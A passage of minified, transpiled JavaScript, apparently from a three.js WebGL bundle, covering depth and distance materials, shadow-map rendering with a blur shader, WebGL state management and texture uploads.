_createClass2(n,[{key:"copy",value:function(e){return _get2(_getPrototypeOf(n.prototype),"copy",this).call(this,e),this.depthPacking=e.depthPacking,this.map=e.map,this.alphaMap=e.alphaMap,this.displacementMap=e.displacementMap,this.displacementScale=e.displacementScale,this.displacementBias=e.displacementBias,this.wireframe=e.wireframe,this.wireframeLinewidth=e.wireframeLinewidth,this}}]),n}();_a.prototype.isMeshDepthMaterial=!0;var wa=function(e){_inherits2(n,Lt);var t=_createSuper(n);function n(e){var r;return _classCallCheck2(this,n),(r=t.call(this)).type="MeshDistanceMaterial",r.referencePosition=new ye,r.nearDistance=1,r.farDistance=1e3,r.map=null,r.alphaMap=null,r.displacementMap=null,r.displacementScale=1,r.displacementBias=0,r.fog=!1,r.setValues(e),r}return _createClass2(n,[{key:"copy",value:function(e){return _get2(_getPrototypeOf(n.prototype),"copy",this).call(this,e),this.referencePosition.copy(e.referencePosition),this.nearDistance=e.nearDistance,this.farDistance=e.farDistance,this.map=e.map,this.alphaMap=e.alphaMap,this.displacementMap=e.displacementMap,this.displacementScale=e.displacementScale,this.displacementBias=e.displacementBias,this}}]),n}();wa.prototype.isMeshDistanceMaterial=!0;function Ca(e,t,n){var r=new Gn,i=new re,a=new re,o=new fe,s=new _a({depthPacking:3201}),l=new wa,c={},u=n.maxTextureSize,d={0:1,1:0,2:2},h=new Ln({defines:{VSM_SAMPLES:8},uniforms:{shadow_pass:{value:null},resolution:{value:new re},radius:{value:4}},vertexShader:"void main() {\n\tgl_Position = vec4( position, 1.0 );\n}",fragmentShader:"uniform sampler2D shadow_pass;\nuniform vec2 resolution;\nuniform float radius;\n#include <packing>\nvoid main() {\n\tconst float samples = float( VSM_SAMPLES );\n\tfloat mean = 0.0;\n\tfloat squared_mean = 0.0;\n\tfloat uvStride = samples <= 1.0 ? 0.0 : 2.0 / ( samples - 1.0 );\n\tfloat uvStart = samples <= 1.0 ? 0.0 : - 1.0;\n\tfor ( float i = 0.0; i < samples; i ++ ) {\n\t\tfloat uvOffset = uvStart + i * uvStride;\n\t\t#ifdef HORIZONTAL_PASS\n\t\t\tvec2 distribution = unpackRGBATo2Half( texture2D( shadow_pass, ( gl_FragCoord.xy + vec2( uvOffset, 0.0 ) * radius ) / resolution ) );\n\t\t\tmean += distribution.x;\n\t\t\tsquared_mean += distribution.y * distribution.y + distribution.x * distribution.x;\n\t\t#else\n\t\t\tfloat depth = unpackRGBAToDepth( texture2D( shadow_pass, ( gl_FragCoord.xy + vec2( 0.0, uvOffset ) * radius ) / resolution ) );\n\t\t\tmean += depth;\n\t\t\tsquared_mean += depth * depth;\n\t\t#endif\n\t}\n\tmean = mean / samples;\n\tsquared_mean = squared_mean / samples;\n\tfloat std_dev = sqrt( squared_mean - mean * mean );\n\tgl_FragColor = pack2HalfToRGBA( vec2( mean, std_dev ) );\n}"}),f=h.clone();f.defines.HORIZONTAL_PASS=1;var m=new un;m.setAttribute("position",new Qt(new Float32Array([-1,-1,.5,3,-1,.5,-1,3,.5]),3));var v=new Bn(m,h),g=this;function y(n,r){var i=t.update(v);h.defines.VSM_SAMPLES!==n.blurSamples&&(h.defines.VSM_SAMPLES=n.blurSamples,f.defines.VSM_SAMPLES=n.blurSamples,h.needsUpdate=!0,f.needsUpdate=!0),h.uniforms.shadow_pass.value=n.map.texture,h.uniforms.resolution.value=n.mapSize,h.uniforms.radius.value=n.radius,e.setRenderTarget(n.mapPass),e.clear(),e.renderBufferDirect(r,null,i,h,v,null),f.uniforms.shadow_pass.value=n.mapPass.texture,f.uniforms.resolution.value=n.mapSize,f.uniforms.radius.value=n.radius,e.setRenderTarget(n.map),e.clear(),e.renderBufferDirect(r,null,i,f,v,null)}function b(t,n,r,i,a,o,u){var p=null,h=!0===i.isPointLight?t.customDistanceMaterial:t.customDepthMaterial;if(p=void 0!==h?h:!0===i.isPointLight?l:s,e.localClippingEnabled&&!0===r.clipShadows&&0!==r.clippingPlanes.length||r.displacementMap&&0!==r.displacementScale||r.alphaMap&&0<r.alphaTest){var f=p.uuid,A=r.uuid,m=c[f];void 0===m&&(m={},c[f]=m);var v=m[A];void 0===v&&(v=p.clone(),m[A]=v),p=v}return p.visible=r.visible,p.wireframe=r.wireframe,p.side=3===u?null!==r.shadowSide?r.shadowSide:r.side:null!==r.shadowSide?r.shadowSide:d[r.side],p.alphaMap=r.alphaMap,p.alphaTest=r.alphaTest,p.clipShadows=r.clipShadows,p.clippingPlanes=r.clippingPlanes,p.clipIntersection=r.clipIntersection,p.displacementMap=r.displacementMap,p.displacementScale=r.displacementScale,p.displacementBias=r.displacementBias,p.wireframeLinewidth=r.wireframeLinewidth,p.linewidth=r.linewidth,!0===i.isPointLight&&!0===p.isMeshDistanceMaterial&&(p.referencePosition.setFromMatrixPosition(i.matrixWorld),p.nearDistance=a,p.farDistance=o),p}function _(n,i,a,o,s){if(!1!==n.visible){if(n.layers.test(i.layers)&&(n.isMesh||n.isLine||n.isPoints)&&(n.castShadow||n.receiveShadow&&3===s)&&(!n.frustumCulled||r.intersectsObject(n))){n.modelViewMatrix.multiplyMatrices(a.matrixWorldInverse,n.matrixWorld);var l=t.update(n),c=n.material;if(Array.isArray(c))for(var u=l.groups,d=0,p=u.length;d<p;d++){var h=u[d],f=c[h.materialIndex];if(f&&f.visible){var A=b(n,0,f,o,a.near,a.far,s);e.renderBufferDirect(a,null,l,A,n,h)}}else if(c.visible){var m=b(n,0,c,o,a.near,a.far,s);e.renderBufferDirect(a,null,l,m,n,null)}}for(var v=n.children,g=0,y=v.length;g<y;g++)_(v[g],i,a,o,s)}}this.enabled=!1,this.autoUpdate=!0,this.needsUpdate=!1,this.type=1,this.render=function(t,n,s){if(!1!==g.enabled&&(!1!==g.autoUpdate||!1!==g.needsUpdate)&&0!==t.length){var l=e.getRenderTarget(),c=e.getActiveCubeFace(),d=e.getActiveMipmapLevel(),h=e.state;h.setBlending(0),h.buffers.color.setClear(1,1,1,1),h.buffers.depth.setTest(!0),h.setScissorTest(!1);for(var f=0,m=t.length;f<m;f++){var v=t[f],b=v.shadow;if(void 0!==b&&(!1!==b.autoUpdate||!1!==b.needsUpdate)){i.copy(b.mapSize);var w=b.getFrameExtents();if(i.multiply(w),a.copy(b.mapSize),(i.x>u||i.y>u)&&(i.x>u&&(a.x=Math.floor(u/w.x),i.x=a.x*w.x,b.mapSize.x=a.x),i.y>u&&(a.y=Math.floor(u/w.y),i.y=a.y*w.y,b.mapSize.y=a.y)),null===b.map&&!b.isPointLightShadow&&3===this.type){var C={minFilter:A,magFilter:A,format:S};b.map=new Ae(i.x,i.y,C),b.map.texture.name=v.name+".shadowMap",b.mapPass=new Ae(i.x,i.y,C),b.camera.updateProjectionMatrix()}if(null===b.map){var x={minFilter:p,magFilter:p,format:S};b.map=new Ae(i.x,i.y,x),b.map.texture.name=v.name+".shadowMap",b.camera.updateProjectionMatrix()}e.setRenderTarget(b.map),e.clear();for(var k=b.getViewportCount(),M=0;M<k;M++){var B=b.getViewport(M);o.set(a.x*B.x,a.y*B.y,a.x*B.z,a.y*B.w),h.viewport(o),b.updateMatrices(v,M),r=b.getFrustum(),_(n,s,b.camera,v,this.type)}b.isPointLightShadow||3!==this.type||y(b,s),b.needsUpdate=!1}}g.needsUpdate=!1,e.setRenderTarget(l,c,d)}}}function xa(e,t,r){var i,a,o=r.isWebGL2,s=new function(){var t=!1,n=new fe,r=null,i=new fe(0,0,0,0);return{setMask:function(n){r===n||t||(e.colorMask(n,n,n,n),r=n)},setLocked:function(e){t=e},setClear:function(t,r,a,o,s){!0===s&&(t*=o,r*=o,a*=o),n.set(t,r,a,o),!1===i.equals(n)&&(e.clearColor(t,r,a,o),i.copy(n))},reset:function(){t=!1,r=null,i.set(-1,0,0,0)}}},l=new function(){var t=!1,n=null,r=null,i=null;return{setTest:function(t){t?j(e.DEPTH_TEST):U(e.DEPTH_TEST)},setMask:function(r){n===r||t||(e.depthMask(r),n=r)},setFunc:function(t){if(r!==t){if(t)switch(t){case 0:e.depthFunc(e.NEVER);break;case 1:e.depthFunc(e.ALWAYS);break;case 2:e.depthFunc(e.LESS);break;case 3:e.depthFunc(e.LEQUAL);break;case 4:e.depthFunc(e.EQUAL);break;case 5:e.depthFunc(e.GEQUAL);break;case 6:e.depthFunc(e.GREATER);break;case 7:e.depthFunc(e.NOTEQUAL);break;default:e.depthFunc(e.LEQUAL)}else e.depthFunc(e.LEQUAL);r=t}},setLocked:function(e){t=e},setClear:function(t){i!==t&&(e.clearDepth(t),i=t)},reset:function(){t=!1,i=r=n=null}}},c=new function(){var t=!1,n=null,r=null,i=null,a=null,o=null,s=null,l=null,c=null;return{setTest:function(n){t||(n?j(e.STENCIL_TEST):U(e.STENCIL_TEST))},setMask:function(r){n===r||t||(e.stencilMask(r),n=r)},setFunc:function(t,n,o){r===t&&i===n&&a===o||(e.stencilFunc(t,n,o),r=t,i=n,a=o)},setOp:function(t,n,r){o===t&&s===n&&l===r||(e.stencilOp(t,n,r),o=t,s=n,l=r)},setLocked:function(e){t=e},setClear:function(t){c!==t&&(e.clearStencil(t),c=t)},reset:function(){t=!1,c=l=s=o=a=i=r=n=null}}},u={},d={},p=null,h=!1,f=null,A=null,m=null,v=null,g=null,y=null,b=null,_=!1,w=null,C=null,x=null,S=null,k=null,M=e.getParameter(e.MAX_COMBINED_TEXTURE_IMAGE_UNITS),B=!1,E=0,T=e.getParameter(e.VERSION);-1!==T.indexOf("WebGL")?(E=parseFloat(/^WebGL (\d)/.exec(T)[1]),B=1<=E):-1!==T.indexOf("OpenGL ES")&&(E=parseFloat(/^OpenGL ES (\d)/.exec(T)[1]),B=2<=E);var P=null,I={},F=e.getParameter(e.SCISSOR_BOX),L=e.getParameter(e.VIEWPORT),O=(new fe).fromArray(F),N=(new fe).fromArray(L);function D(t,n,r){var i=new Uint8Array(4),a=e.createTexture();e.bindTexture(t,a),e.texParameteri(t,e.TEXTURE_MIN_FILTER,e.NEAREST),e.texParameteri(t,e.TEXTURE_MAG_FILTER,e.NEAREST);for(var o=0;o<r;o++)e.texImage2D(n+o,0,e.RGBA,1,1,0,e.RGBA,e.UNSIGNED_BYTE,i);return a}var R={};function j(t){!0!==u[t]&&(e.enable(t),u[t]=!0)}function U(t){!1!==u[t]&&(e.disable(t),u[t]=!1)}R[e.TEXTURE_2D]=D(e.TEXTURE_2D,e.TEXTURE_2D,1),R[e.TEXTURE_CUBE_MAP]=D(e.TEXTURE_CUBE_MAP,e.TEXTURE_CUBE_MAP_POSITIVE_X,6),s.setClear(0,0,0,1),l.setClear(1),c.setClear(0),j(e.DEPTH_TEST),l.setFunc(3),Q(!1),G(1),j(e.CULL_FACE),V(0);var $=(_defineProperty2(i={},n,e.FUNC_ADD),_defineProperty2(i,101,e.FUNC_SUBTRACT),_defineProperty2(i,102,e.FUNC_REVERSE_SUBTRACT),i);if(o)$[103]=e.MIN,$[104]=e.MAX;else{var z=t.get("EXT_blend_minmax");null!==z&&($[103]=z.MIN_EXT,$[104]=z.MAX_EXT)}var H=(_defineProperty2(a={},200,e.ZERO),_defineProperty2(a,201,e.ONE),_defineProperty2(a,202,e.SRC_COLOR),_defineProperty2(a,204,e.SRC_ALPHA),_defineProperty2(a,210,e.SRC_ALPHA_SATURATE),_defineProperty2(a,208,e.DST_COLOR),_defineProperty2(a,206,e.DST_ALPHA),_defineProperty2(a,203,e.ONE_MINUS_SRC_COLOR),_defineProperty2(a,205,e.ONE_MINUS_SRC_ALPHA),_defineProperty2(a,209,e.ONE_MINUS_DST_COLOR),_defineProperty2(a,207,e.ONE_MINUS_DST_ALPHA),a);function V(t,r,i,a,o,s,l,c){if(0!==t){if(!1===h&&(j(e.BLEND),h=!0),5===t)o=o||r,s=s||i,l=l||a,r===A&&o===g||(e.blendEquationSeparate($[r],$[o]),A=r,g=o),i===m&&a===v&&s===y&&l===b||(e.blendFuncSeparate(H[i],H[a],H[s],H[l]),m=i,v=a,y=s,b=l),f=t,_=null;else if(t!==f||c!==_){if(A===n&&g===n||(e.blendEquation(e.FUNC_ADD),g=A=n),c)switch(t){case 1:e.blendFuncSeparate(e.ONE,e.ONE_MINUS_SRC_ALPHA,e.ONE,e.ONE_MINUS_SRC_ALPHA);break;case 2:e.blendFunc(e.ONE,e.ONE);break;case 3:e.blendFuncSeparate(e.ZERO,e.ZERO,e.ONE_MINUS_SRC_COLOR,e.ONE_MINUS_SRC_ALPHA);break;case 4:e.blendFuncSeparate(e.ZERO,e.SRC_COLOR,e.ZERO,e.SRC_ALPHA)}else switch(t){case 1:e.blendFuncSeparate(e.SRC_ALPHA,e.ONE_MINUS_SRC_ALPHA,e.ONE,e.ONE_MINUS_SRC_ALPHA);break;case 2:e.blendFunc(e.SRC_ALPHA,e.ONE);break;case 3:e.blendFunc(e.ZERO,e.ONE_MINUS_SRC_COLOR);break;case 4:e.blendFunc(e.ZERO,e.SRC_COLOR)}b=y=v=m=null,f=t,_=c}}else!0===h&&(U(e.BLEND),h=!1)}function Q(t){w!==t&&(t?e.frontFace(e.CW):e.frontFace(e.CCW),w=t)}function G(t){0!==t?(j(e.CULL_FACE),t!==C&&(1===t?e.cullFace(e.BACK):2===t?e.cullFace(e.FRONT):e.cullFace(e.FRONT_AND_BACK))):U(e.CULL_FACE),C=t}function W(t,n,r){t?(j(e.POLYGON_OFFSET_FILL),S===n&&k===r||(e.polygonOffset(n,r),S=n,k=r)):U(e.POLYGON_OFFSET_FILL)}function K(t){void 0===t&&(t=e.TEXTURE0+M-1),P!==t&&(e.activeTexture(t),P=t)}return{buffers:{color:s,depth:l,stencil:c},enable:j,disable:U,bindFramebuffer:function(t,n){return d[t]!==n&&(e.bindFramebuffer(t,n),d[t]=n,o&&(t===e.DRAW_FRAMEBUFFER&&(d[e.FRAMEBUFFER]=n),t===e.FRAMEBUFFER&&(d[e.DRAW_FRAMEBUFFER]=n)),!0)},useProgram:function(t){return p!==t&&(e.useProgram(t),p=t,!0)},setBlending:V,setMaterial:function(t,n){2===t.side?U(e.CULL_FACE):j(e.CULL_FACE);var r=1===t.side;n&&(r=!r),Q(r),1===t.blending&&!1===t.transparent?V(0):V(t.blending,t.blendEquation,t.blendSrc,t.blendDst,t.blendEquationAlpha,t.blendSrcAlpha,t.blendDstAlpha,t.premultipliedAlpha),l.setFunc(t.depthFunc),l.setTest(t.depthTest),l.setMask(t.depthWrite),s.setMask(t.colorWrite);var i=t.stencilWrite;c.setTest(i),i&&(c.setMask(t.stencilWriteMask),c.setFunc(t.stencilFunc,t.stencilRef,t.stencilFuncMask),c.setOp(t.stencilFail,t.stencilZFail,t.stencilZPass)),W(t.polygonOffset,t.polygonOffsetFactor,t.polygonOffsetUnits),!0===t.alphaToCoverage?j(e.SAMPLE_ALPHA_TO_COVERAGE):U(e.SAMPLE_ALPHA_TO_COVERAGE)},setFlipSided:Q,setCullFace:G,setLineWidth:function(t){t!==x&&(B&&e.lineWidth(t),x=t)},setPolygonOffset:W,setScissorTest:function(t){t?j(e.SCISSOR_TEST):U(e.SCISSOR_TEST)},activeTexture:K,bindTexture:function(t,n){null===P&&K();var r=I[P];void 0===r&&(r={type:void 0,texture:void 0},I[P]=r),r.type===t&&r.texture===n||(e.bindTexture(t,n||R[t]),r.type=t,r.texture=n)},unbindTexture:function(){var t=I[P];void 0!==t&&void 0!==t.type&&(e.bindTexture(t.type,null),t.type=void 0,t.texture=void 0)},compressedTexImage2D:function(){try{e.compressedTexImage2D.apply(e,arguments)}catch(e){}},texImage2D:function(){try{e.texImage2D.apply(e,arguments)}catch(e){}},texImage3D:function(){try{e.texImage3D.apply(e,arguments)}catch(e){}},texStorage2D:function(){try{e.texStorage2D.apply(e,arguments)}catch(e){}},texStorage3D:function(){try{e.texStorage3D.apply(e,arguments)}catch(e){}},texSubImage2D:function(){try{e.texSubImage2D.apply(e,arguments)}catch(e){}},texSubImage3D:function(){try{e.texSubImage3D.apply(e,arguments)}catch(e){}},compressedTexSubImage2D:function(){try{e.compressedTexSubImage2D.apply(e,arguments)}catch(e){}},scissor:function(t){!1===O.equals(t)&&(e.scissor(t.x,t.y,t.z,t.w),O.copy(t))},viewport:function(t){!1===N.equals(t)&&(e.viewport(t.x,t.y,t.z,t.w),N.copy(t))},reset:function(){e.disable(e.BLEND),e.disable(e.CULL_FACE),e.disable(e.DEPTH_TEST),e.disable(e.POLYGON_OFFSET_FILL),e.disable(e.SCISSOR_TEST),e.disable(e.STENCIL_TEST),e.disable(e.SAMPLE_ALPHA_TO_COVERAGE),e.blendEquation(e.FUNC_ADD),e.blendFunc(e.ONE,e.ZERO),e.blendFuncSeparate(e.ONE,e.ZERO,e.ONE,e.ZERO),e.colorMask(!0,!0,!0,!0),e.clearColor(0,0,0,0),e.depthMask(!0),e.depthFunc(e.LESS),e.clearDepth(1),e.stencilMask(4294967295),e.stencilFunc(e.ALWAYS,0,4294967295),e.stencilOp(e.KEEP,e.KEEP,e.KEEP),e.clearStencil(0),e.cullFace(e.BACK),e.frontFace(e.CCW),e.polygonOffset(0,0),e.activeTexture(e.TEXTURE0),e.bindFramebuffer(e.FRAMEBUFFER,null),!0===o&&(e.bindFramebuffer(e.DRAW_FRAMEBUFFER,null),e.bindFramebuffer(e.READ_FRAMEBUFFER,null)),e.useProgram(null),e.lineWidth(1),e.scissor(0,0,e.canvas.width,e.canvas.height),e.viewport(0,0,e.canvas.width,e.canvas.height),u={},I={},d={},_=h=!1,k=S=x=C=w=b=y=g=v=m=A=f=p=P=null,O.set(0,0,e.canvas.width,e.canvas.height),N.set(0,0,e.canvas.width,e.canvas.height),s.reset(),l.reset(),c.reset()}}}function Sa(e,t,n,r,i,a,o){var s,l,g,B=i.isWebGL2,E=(i.maxTextures,i.maxCubemapSize),T=i.maxTextureSize,P=i.maxSamples,I=t.has("WEBGL_multisampled_render_to_texture")?t.get("WEBGL_multisampled_render_to_texture"):void 0,F=new WeakMap,L=!1;try{L="undefined"!=typeof OffscreenCanvas&&null!==new OffscreenCanvas(1,1).getContext("2d")}catch(s){}function O(e,t){return L?new OffscreenCanvas(e,t):ce("canvas")}function N(e,t,n,r){var i=1;if((e.width>r||e.height>r)&&(i=r/Math.max(e.width,e.height)),i<1||!0===t){if("undefined"!=typeof HTMLImageElement&&e instanceof HTMLImageElement||"undefined"!=typeof HTMLCanvasElement&&e instanceof HTMLCanvasElement||"undefined"!=typeof ImageBitmap&&e instanceof ImageBitmap){var a=t?te:Math.floor,o=a(i*e.width),s=a(i*e.height);void 0===g&&(g=O(o,s));var l=n?O(o,s):g;return l.width=o,l.height=s,l.getContext("2d").drawImage(e,0,0,o,s),l}return e}return e}function D(e){return Z(e.width)&&Z(e.height)}function R(e,t){return e.generateMipmaps&&t&&e.minFilter!==p&&e.minFilter!==A}function U(t){e.generateMipmap(t)}function $(n,r,i,a){if(!1===B)return r;if(null!==n&&void 0!==e[n])return e[n];var o=r;return r===e.RED&&(i===e.FLOAT&&(o=e.R32F),i===e.HALF_FLOAT&&(o=e.R16F),i===e.UNSIGNED_BYTE&&(o=e.R8)),r===e.RGB&&(i===e.FLOAT&&(o=e.RGB32F),i===e.HALF_FLOAT&&(o=e.RGB16F),i===e.UNSIGNED_BYTE&&(o=e.RGB8)),r===e.RGBA&&(i===e.FLOAT&&(o=e.RGBA32F),i===e.HALF_FLOAT&&(o=e.RGBA16F),i===e.UNSIGNED_BYTE&&(o=a===j?e.SRGB8_ALPHA8:e.RGBA8)),o!==e.R16F&&o!==e.R32F&&o!==e.RGBA16F&&o!==e.RGBA32F||t.get("EXT_color_buffer_float"),o}function z(e,t,n){return!0===R(e,n)||e.isFramebufferTexture&&e.minFilter!==p&&e.minFilter!==A?Math.log2(Math.max(t.width,t.height))+1:void 0!==e.mipmaps&&0<e.mipmaps.length?e.mipmaps.length:e.isCompressedTexture&&Array.isArray(e.image)?t.mipmaps.length:1}function H(t){return t===p||t===h||t===f?e.NEAREST:e.LINEAR}function V(t){var n=t.target;n.removeEventListener("dispose",V),function(t){var n=r.get(t);void 0!==n.__webglInit&&(e.deleteTexture(n.__webglTexture),r.remove(t))}(n),n.isVideoTexture&&F.delete(n),o.memory.textures--}function Q(t){var n=t.target;n.removeEventListener("dispose",Q),function(t){var n=t.texture,i=r.get(t),a=r.get(n);if(t){if(void 0!==a.__webglTexture&&(e.deleteTexture(a.__webglTexture),o.memory.textures--),t.depthTexture&&t.depthTexture.dispose(),t.isWebGLCubeRenderTarget)for(var s=0;s<6;s++)e.deleteFramebuffer(i.__webglFramebuffer[s]),i.__webglDepthbuffer&&e.deleteRenderbuffer(i.__webglDepthbuffer[s]);else e.deleteFramebuffer(i.__webglFramebuffer),i.__webglDepthbuffer&&e.deleteRenderbuffer(i.__webglDepthbuffer),i.__webglMultisampledFramebuffer&&e.deleteFramebuffer(i.__webglMultisampledFramebuffer),i.__webglColorRenderbuffer&&e.deleteRenderbuffer(i.__webglColorRenderbuffer),i.__webglDepthRenderbuffer&&e.deleteRenderbuffer(i.__webglDepthRenderbuffer);if(t.isWebGLMultipleRenderTargets)for(var l=0,c=n.length;l<c;l++){var u=r.get(n[l]);u.__webglTexture&&(e.deleteTexture(u.__webglTexture),o.memory.textures--),r.remove(n[l])}r.remove(n),r.remove(t)}}(n)}var G=0;function W(t,i){var a,s,l=r.get(t);if(t.isVideoTexture&&(a=t,s=o.render.frame,F.get(a)!==s&&(F.set(a,s),a.update())),0<t.version&&l.__version!==t.version){var c=t.image;if(void 0===c);else if(!1!==c.complete)return void ee(l,t,i)}n.activeTexture(e.TEXTURE0+i),n.bindTexture(e.TEXTURE_2D,l.__webglTexture)}function K(t,i){var o=r.get(t);0<t.version&&o.__version!==t.version?function(t,r,i){if(6===r.image.length){J(t,r),n.activeTexture(e.TEXTURE0+i),n.bindTexture(e.TEXTURE_CUBE_MAP,t.__webglTexture),e.pixelStorei(e.UNPACK_FLIP_Y_WEBGL,r.flipY),e.pixelStorei(e.UNPACK_PREMULTIPLY_ALPHA_WEBGL,r.premultiplyAlpha),e.pixelStorei(e.UNPACK_ALIGNMENT,r.unpackAlignment),e.pixelStorei(e.UNPACK_COLORSPACE_CONVERSION_WEBGL,e.NONE);for(var o=r&&(r.isCompressedTexture||r.image[0].isCompressedTexture),s=r.image[0]&&r.image[0].isDataTexture,l=[],c=0;c<6;c++)l[c]=o||s?s?r.image[c].image:r.image[c]:N(r.image[c],!1,!0,E);var u,d=l[0],p=D(d)||B,h=a.convert(r.format),f=a.convert(r.type),A=$(r.internalFormat,h,f,r.encoding),m=B&&!0!==r.isVideoTexture,v=void 0===t.__version,g=z(r,d,p);if(Y(e.TEXTURE_CUBE_MAP,r,p),o){m&&v&&n.texStorage2D(e.TEXTURE_CUBE_MAP,g,A,d.width,d.height);for(var y=0;y<6;y++){u=l[y].mipmaps;for(var b=0;b<u.length;b++){var _=u[b];r.format!==S&&r.format!==x?null!==h&&(m?n.compressedTexSubImage2D(e.TEXTURE_CUBE_MAP_POSITIVE_X+y,b,0,0,_.width,_.height,h,_.data):n.compressedTexImage2D(e.TEXTURE_CUBE_MAP_POSITIVE_X+y,b,A,_.width,_.height,0,_.data)):m?n.texSubImage2D(e.TEXTURE_CUBE_MAP_POSITIVE_X+y,b,0,0,_.width,_.height,h,f,_.data):n.texImage2D(e.TEXTURE_CUBE_MAP_POSITIVE_X+y,b,A,_.width,_.height,0,h,f,_.data)}}}else{u=r.mipmaps,m&&v&&(0<u.length&&g++,n.texStorage2D(e.TEXTURE_CUBE_MAP,g,A,l[0].width,l[0].height));for(var w=0;w<6;w++)if(s){m?n.texSubImage2D(e.TEXTURE_CUBE_MAP_POSITIVE_X+w,0,0,0,l[w].width,l[w].height,h,f,l[w].data):n.texImage2D(e.TEXTURE_CUBE_MAP_POSITIVE_X+w,0,A,l[w].width,l[w].height,0,h,f,l[w].data);for(var C=0;C<u.length;C++){var k=u[C].image[w].image;m?n.texSubImage2D(e.TEXTURE_CUBE_MAP_POSITIVE_X+w,C+1,0,0,k.width,k.height,h,f,k.data):n.texImage2D(e.TEXTURE_CUBE_MAP_POSITIVE_X+w,C+1,A,k.width,k.height,0,h,f,k.data)}}else{m?n.texSubImage2D(e.TEXTURE_CUBE_MAP_POSITIVE_X+w,0,0,0,h,f,l[w]):n.texImage2D(e.TEXTURE_CUBE_MAP_POSITIVE_X+w,0,A,h,f,l[w]);for(var M=0;M<u.length;M++){var T=u[M];m?n.texSubImage2D(e.TEXTURE_CUBE_MAP_POSITIVE_X+w,M+1,0,0,h,f,T.image[w]):n.texImage2D(e.TEXTURE_CUBE_MAP_POSITIVE_X+w,M+1,A,h,f,T.image[w])}}}R(r,p)&&U(e.TEXTURE_CUBE_MAP),t.__version=r.version,r.onUpdate&&r.onUpdate(r)}}(o,t,i):(n.activeTexture(e.TEXTURE0+i),n.bindTexture(e.TEXTURE_CUBE_MAP,o.__webglTexture))}var q=(_defineProperty2(s={},c,e.REPEAT),_defineProperty2(s,u,e.CLAMP_TO_EDGE),_defineProperty2(s,d,e.MIRRORED_REPEAT),s),X=(_defineProperty2(l={},p,e.NEAREST),_defineProperty2(l,h,e.NEAREST_MIPMAP_NEAREST),_defineProperty2(l,f,e.NEAREST_MIPMAP_LINEAR),_defineProperty2(l,A,e.LINEAR),_defineProperty2(l,m,e.LINEAR_MIPMAP_NEAREST),_defineProperty2(l,v,e.LINEAR_MIPMAP_LINEAR),l);function Y(n,a,o){if(o?(e.texParameteri(n,e.TEXTURE_WRAP_S,q[a.wrapS]),e.texParameteri(n,e.TEXTURE_WRAP_T,q[a.wrapT]),n!==e.TEXTURE_3D&&n!==e.TEXTURE_2D_ARRAY||e.texParameteri(n,e.TEXTURE_WRAP_R,q[a.wrapR]),e.texParameteri(n,e.TEXTURE_MAG_FILTER,X[a.magFilter]),e.texParameteri(n,e.TEXTURE_MIN_FILTER,X[a.minFilter])):(e.texParameteri(n,e.TEXTURE_WRAP_S,e.CLAMP_TO_EDGE),e.texParameteri(n,e.TEXTURE_WRAP_T,e.CLAMP_TO_EDGE),n!==e.TEXTURE_3D&&n!==e.TEXTURE_2D_ARRAY||e.texParameteri(n,e.TEXTURE_WRAP_R,e.CLAMP_TO_EDGE),a.wrapS!==u||a.wrapT,e.texParameteri(n,e.TEXTURE_MAG_FILTER,H(a.magFilter)),e.texParameteri(n,e.TEXTURE_MIN_FILTER,H(a.minFilter)),a.minFilter!==p&&a.minFilter),!0===t.has("EXT_texture_filter_anisotropic")){var s=t.get("EXT_texture_filter_anisotropic");if(a.type===_&&!1===t.has("OES_texture_float_linear"))return;if(!1===B&&a.type===w&&!1===t.has("OES_texture_half_float_linear"))return;(1<a.anisotropy||r.get(a).__currentAnisotropy)&&(e.texParameterf(n,s.TEXTURE_MAX_ANISOTROPY_EXT,Math.min(a.anisotropy,i.getMaxAnisotropy())),r.get(a).__currentAnisotropy=a.anisotropy)}}function J(t,n){void 0===t.__webglInit&&(t.__webglInit=!0,n.addEventListener("dispose",V),t.__webglTexture=e.createTexture(),o.memory.textures++)}function ee(t,r,i){var o=e.TEXTURE_2D;r.isDataTexture2DArray&&(o=e.TEXTURE_2D_ARRAY),r.isDataTexture3D&&(o=e.TEXTURE_3D),J(t,r),n.activeTexture(e.TEXTURE0+i),n.bindTexture(o,t.__webglTexture),e.pixelStorei(e.UNPACK_FLIP_Y_WEBGL,r.flipY),e.pixelStorei(e.UNPACK_PREMULTIPLY_ALPHA_WEBGL,r.premultiplyAlpha),e.pixelStorei(e.UNPACK_ALIGNMENT,r.unpackAlignment),e.pixelStorei(e.UNPACK_COLORSPACE_CONVERSION_WEBGL,e.NONE);var s,l,c=(s=r,!B&&(s.wrapS!==u||s.wrapT!==u||s.minFilter!==p&&s.minFilter!==A)&&!1===D(r.image)),d=N(r.image,c,!1,T),h=D(d)||B,f=a.convert(r.format),m=a.convert(r.type),v=$(r.internalFormat,f,m,r.encoding);Y(o,r,h);var g=r.mipmaps,w=B&&!0!==r.isVideoTexture,E=void 0===t.__version,P=z(r,d,h);if(r.isDepthTexture)v=e.DEPTH_COMPONENT,B?v=r.type===_?e.DEPTH_COMPONENT32F:r.type===b?e.DEPTH_COMPONENT24:r.type===C?e.DEPTH24_STENCIL8:e.DEPTH_COMPONENT16:r.type,r.format===k&&v===e.DEPTH_COMPONENT&&r.type!==y&&r.type!==b&&(r.type=y,m=a.convert(r.type)),r.format===M&&v===e.DEPTH_COMPONENT&&(v=e.DEPTH_STENCIL,r.type!==C&&(r.type=C,m=a.convert(r.type))),w&&E?n.texStorage2D(e.TEXTURE_2D,1,v,d.width,d.height):n.texImage2D(e.TEXTURE_2D,0,v,d.width,d.height,0,f,m,null);else if(r.isDataTexture)if(0<g.length&&h){w&&E&&n.texStorage2D(e.TEXTURE_2D,P,v,g[0].width,g[0].height);for(var I=0,F=g.length;I<F;I++)l=g[I],w?n.texSubImage2D(e.TEXTURE_2D,0,0,0,l.width,l.height,f,m,l.data):n.texImage2D(e.TEXTURE_2D,I,v,l.width,l.height,0,f,m,l.data);r.generateMipmaps=!1}else w?(E&&n.texStorage2D(e.TEXTURE_2D,P,v,d.width,d.height),n.texSubImage2D(e.TEXTURE_2D,0,0,0,d.width,d.height,f,m,d.data)):n.texImage2D(e.TEXTURE_2D,0,v,d.width,d.height,0,f,m,d.data);else if(r.isCompressedTexture){w&&E&&n.texStorage2D(e.TEXTURE_2D,P,v,g[0].width,g[0].height);for(var 